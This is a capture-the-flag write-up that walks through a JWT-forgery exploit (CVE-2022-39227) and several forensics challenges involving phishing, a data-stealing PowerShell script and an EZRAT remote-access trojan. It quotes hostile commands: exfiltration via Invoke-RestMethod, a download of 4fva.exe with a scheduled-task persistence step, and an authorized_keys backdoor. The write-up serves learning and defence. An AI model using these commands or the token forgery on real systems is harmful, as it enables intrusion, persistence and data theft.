$ python3 cve_2022_39227.py -j 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA' -i 'role=administrator'
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
<...SNIP...>
Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA"}
```
The output is a little messy because the token is fat, but the way to use is `-j` flag to define your valid cookie, then `-i` flag to supply the tampered information. Here is set role as administrator, and note that unlike the cookie format, I supply as `<KEY>=<VALUE>`.

Now when we supply the token (including braces and quotes), we receive the flag!
![](images/locktalk.png)

`HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`

## Forensics
### Urgent
Difficulty: Very Easy
>In the midst of Cybercity's "Fray," a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions' destiny.
-----------------------
In the supplied email, we see a base64 encoded attachment named "onlineform.html". Using `base64`, i decode this through an echo:
```
 echo 'PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT48L3RpdGxlPg0KPGJvZHk+DQo8c2NyaXB0IGxhbmd1YWdl
 <...SNIP...>' | base64 -d
<html>
<head>
<title></title>
<body>
<script language="JavaScript" type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0d%0a%3c
<...SNIP...>
%65%61%64%3e%0d%0a%3c%2f%68%74%6d%6c%3e%0d%0a'));
</script>
</body>
</html>
```
We can see another large amount of characters displayed as "text/javascript". Based on the regular intervals of `%`, this is clearly URL encoded. Going to cyberchef, we can decode this very simply. Within the decoded contents, we can find our flag:

![](images/urldecode.png)
`HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`


### An Unusual Sighting
Difficulty: Very Easy
>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!
-----------
The work involves a bash log and ssh server log. Looking at the files, we gather data and answer questions presented through a docker ncat instance. Here is the series of questions with answers:
```
Note 2: All timestamps are in the format they appear in the logs

What is the IP Address and Port of the SSH Server (IP:PORT)
> 100.107.36.130:2221
[+] Correct!

What time is the first successful Login

> 2024-02-13 11:29:50
[+] Correct!

What is the time of the unusual Login
> 2024-02-19 04:00:14
[+] Correct!

What is the Fingerprint of the attacker's public key
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[+] Correct!

What is the first command the attacker executed after logging in
> whoami
[+] Correct!

What is the final command the attacker executed before logging out
> ./setup
[+] Correct!
[+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!}
```
1. What is the IP Address and Port of the SSH Server (IP:PORT)
Answer:
```
$ head sshd.log 
[2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221.
[2024-01-19 12:59:11] Server listening on :: port 2221.
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
```
Listening on port 2221, and IP address is disclosed on the first connection log

2. What time is the first successful Login
Answer:
```
$ grep "Accepted" sshd.log 
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
[2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
```
1st time stamp is the first successful login.
3. What is the time of the unusual Login
Answer:
```
$ grep "Accepted" sshd.log 
<...SNIP...>
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
[2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
```
Further down, we see a successful login coming from a strange port `2.67.182.119` (abnormal time of day as well)
4. What is the Fingerprint of the attacker's public key
Answer:
```
$ grep '2.67.182.119' sshd.log 
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```
When filtering by the abnormal IP address, we can see the publickey is also reported as irregular.
5. What is the first command the attacker executed after logging in
```
$ grep "2024-02-19 04" bash_history.txt 
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
```
Check bash_history at the same day and hour of suspicious login activity
6. What is the final command the attacker executed before logging out
```
$ grep "2024-02-19 04" bash_history.txt 
[2024-02-19 04:00:18] whoami
<...SNIP...>
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
```
This is the last command of the hour. If we review the bash_history directly, we can see the next command isn't logged for more than 24 hours later:
```
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:11:14] nvim server.py
```

### Fake Boost
Difficulty: Easy
>In the shadow of The Fray, a new test called ""Fake Boost"" whispers promises of free Discord Nitro perks. It's a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.
-------------------
By sorting for `tcp`, we can quickly identify a GET request on a very suspicious /freediscordnitro:

![](images/freenitro.png)

When we right click -> follow http stream, we can view the request/response contents as a whole, and it contains a very large string of what appears to be base64 encoded characters:

![](images/b64nitro.png)

At the bottom, we can get hints as to the encoding method for this. First we see a Reverse, followed by convert from base64:

![](images/revb64.png)

Using cyberchef, we can transform this query very easily:

![](images/nitrocyberchef.png)

Within the script, we can find a variable `part1` being defined without being used anywhere else:

![](images/nitroflag1.png)

When we base64 decode this, we can see it is part of the flag:
```
echo 'SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf' | base64 -d
HTB{fr33_N17r0G3n_3xp053d!_
```

Back to wireshark, we can also see the data exfiltration event by filtering on `http`:

![](images/nitrosteal.png)

We need to go back to the cyberchef decoded payload, but we can see clearly (with the AES key) how the data is transformed:
```
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
```
Here is the AES key hardcoded from the previous message. Now we can decode the exfiltrated data:

![The Initialization Vector (IV) is appended to the beginning of the message, highlighted in the red box. ](images/nitroflag2.png)

As for the IV, it is supplied at the beginning of the message encased in red box.
Within the decoded JSON, we can see an email field strangely encoded. When we decode with base64, we see the 2nd part of the flag!
```
echo 'YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9' | base64 -d
b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```
The full flag:
`HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}`

### Phreaky
Difficulty: Medium
>In the shadowed realm where the Phreaks hold sway,  
A mole lurks within, leading them astray.  
Sending keys to the Talents, so sly and so slick,  
A network packet capture must reveal the trick.  
Through data and bytes, the sleuth seeks the sign,  
Decrypting messages, crossing the line.  
The traitor unveiled, with nowhere to hide,  
Betrayal confirmed, they'd no longer abide.
------------------------
We are given a `pcap` file once again. This time there is no real interesting TCP requests, but we might quickly find unencrypted email transmissions:

![](images/phreakyemail1.png)

When we follow the content, we can see a base64 encoded attachment. Here we might want to read the message before jumping straight into it:

![](images/phreakyemail2.png)

It describes this attachment as "part of the file" and supplies a password as well. With a name like `efcfd.zip`, we can pretty easily guess the process: First we base64 decode, then unzip with the supplied password. There are several emails relevant to this challenge, so we can use "Export Object" to grab them all:

![](images/exportobjects.png)

From here we see 15 different email messages:

![](images/emails.png)

After saving all, we need to extract the b64 and unzip using the password.

eventually, we are left with 15 pdf part files:
```
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part10
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part11
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part12
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part13
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part14
-rw-rw-r-- 1 spencer spencer     208 Mar  6 09:59  phreaks_plan.pdf.part15
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part1
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part2
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part3
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part4
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part5
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part6
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part7
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part8
-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part9
```
Now we need to reconstruct the pdf. Unfortunately, simply doing `cat phreaks_plan* > plan.pdf` will append out of order, so I had to cat them one by one:
```
cat phreaks_plan.pdf.part0
cat phreaks_plan.pdf.part1 > plan1.pdf
cat phreaks_plan.pdf.part2 >> plan1.pdf
cat phreaks_plan.pdf.part3 >> plan1.pdf
cat phreaks_plan.pdf.part4 >> plan1.pdf
```
And so on..
Eventually we can view, the pdf, which contains the flag at the end:

![](images/pdf.png)

`HTB{Th3Phr3aksReadyT0Att4ck}`


### Data Siege
Difficulty: Medium
>"It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city's messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts."
---------------
Yet another pcap file. The first thing I come across is an interesting Invoke-WebRequest:

![](images/dataIWR.png)

This is part of the webpage response, however it looks to be contained in XML formatting. Perhaps it is something that was executed on our victim? If `aQ4caZ.exe` was indeed downloaded we should be able to export this object.

![](images/exeobject.png)

We do see it here, and as a 29kb file it looks to be fully formed. We don't want to run random executables that we find, but we do need to analyze this. Firstly checking `strings`:
```
$ strings aQ4caZ.exe 
!This program cannot be run in DOS mode.
.text
`.rsrc
<...SNIP...>
EZRATClient
Copyright 
  2019
$2a079f4e-4dcc-44db-8ca1-0cf2c6a5f41d
0.1.6.1
.NETFramework,Version=v4.8
FrameworkDisplayName
.NET Framework 4.8
lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
PADPADP
RSDS
C:\Users\User\Downloads\EZRAT\EZRATClient\obj\Debug\EZRATClient.pdb
_CorExeMain
mscoree.dll
Very_S3cr3t_S
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
```

We can see this looks like a fully functioning executable, and I notice the phrase `EZRATClient` thrown around several times. We certainly don't want to be launching RATs onto our system! While I wasn't able to pull out a flag string directly, we can see in this snippet a *very* interesting string: `Very_S3cr3t_S`. This looks like a section of the flag, but it is clearly not in it's final form.

With the executable file, I turn to dnSpy for further analysis. Within the `EZRATClient.Utils` contents, we can see a private encryption key:

![](images/RATencryptKey.png)

`VYAemVeO3zUDTL6N62kVA`

The next interesting piece is we can find a Decrypt function:

![](images/decrypt.png)

```
public static string Decrypt(string cipherText)        
{
    string text;
    try            
        {
                string encryptKey = Constantes.EncryptKey;
                byte[] array = Convert.FromBase64String(cipherText);
                using (Aes aes = Aes.Create())
                {
                        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]
                        {
                                86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83
                        });
                        aes.Key = rfc2898DeriveBytes.GetBytes(32);
                        aes.IV = rfc2898DeriveBytes.GetBytes(16);
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                                {
                                        cryptoStream.Write(array, 0, array.Length);
                                        cryptoStream.Close();
                                }
                                cipherText = Encoding.Default.GetString(memoryStream.ToArray());
                        }
                }
                text = cipherText;
        }
        catch (Exception ex)
        {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                text = "error";
        }
        return text;
}
```

Side note, translating the array `86,101,114,121,95,83,51,99,114,51,116,95,83` from decimal yields `Very_S3cr3t_S`, our interesting string from earlier.

Returning to the wireshark, there was another TCP string that looked like a lot of encrypted junk. Now that we know how to decrypt, we can revisit:

![](images/encryptedconvo1.png)

To make my life "easier" with the decrypt function, I asked ChatGPT to generate a python script for me. It only took 2 hours of collaborating before I got something that worked. The barely working script only translates 1 message at a time, so I number the important messages and the translated data:

![](images/encryptedconvo2.png)

#### Decrypted Message 1:
```
Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 >> C:\Users\svc01\.ssh\authorized_keys
```
#### Decrypted Message 2:
```
Decrypted Text: cmd;C:\;Username: svc01
Password: Passw0rdCorp5421

2nd flag part: _h45_b33n_r357
```

#### Decrypted Message 3:
```
(New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/4fva.exe", "C:\Users\svc01\AppData\Roaming\4fva.exe")

$action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM

$settings = New-ScheduledTaskSettingsSet

# 3th flag part:

Register-ScheduledTask -TaskName "0r3d_1n_7h3_h34dqu4r73r5}" -Action $action -Trigger $trigger -Settings $settings
```
Note that 3 is just a base64 encoded powershell command, so all that is needed is base64 conversion.
Finally we can combine the flag:
`HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}`

Python decryption script:
```python
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import sys

# Function to decrypt data
def decrypt(cipher_text, encrypt_key):
    try:
        salt = b'Very_S3cr3t_S'  # Salt used for key derivation
        iv_length = 16  # IV length
        key_length = 32  # Key length

        # Derive key and IV using PBKDF2
        key_iv = PBKDF2(encrypt_key, salt, dkLen=key_length + iv_length, count=1000)

        # Extract key and IV
        aes_key = key_iv[:key_length]
        iv = key_iv[key_length:]

        # Create AES cipher object
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)

        # Decode base64 encoded cipher text
        encrypted_data = base64.b64decode(cipher_text)

        # Decrypt the data
        decrypted_data = cipher.decrypt(encrypted_data)

        # Unpad the decrypted data (if padding was used)
        decrypted_data = unpad(decrypted_data)

        # Convert decrypted data to string using 'latin-1' encoding
        text = decrypted_data.decode('latin-1')

    except Exception as ex:
        print(ex)
        print("Cipher Text:", cipher_text)
        text = "error"

    return text


# Function to unpad data
def unpad(s):
    return s[:-ord(s[len(s)-1:])]

# Read cipher text from file
cipher_text_file = "cipher_text.txt"  # Change to the path of your ciphertext file
with open(cipher_text_file, 'r') as file:
    cipher_text = file.read()

encrypt_key = "VYAemVeO3zUDTL6N62kVA"
decrypted_text = decrypt(cipher_text, encrypt_key)
print("Decrypted Text:", decrypted_text)
```
